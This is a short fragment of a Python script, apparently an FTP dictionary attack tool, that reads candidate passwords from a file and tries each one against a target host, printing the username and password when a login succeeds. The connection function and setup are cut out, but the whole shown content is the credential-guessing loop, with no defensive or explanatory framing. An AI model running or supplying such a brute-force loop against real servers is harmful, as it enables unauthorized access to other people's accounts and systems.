    ...
    with open(passwordspath, 'r') as f:
        for line in f:
            ...
            if connect(Hostname, username, password):
                # Password Found
                print(
                    "[+] FTP Logon succeeded on host : " + Hostname + "  using username :  " + username + " and password :  " + password)
                exit(0)
            else:
                # Password not found
                print(
                    "[-] FTP Logon failed on host : " + Hostname + " using username :  " + username + " and password :  " + password)
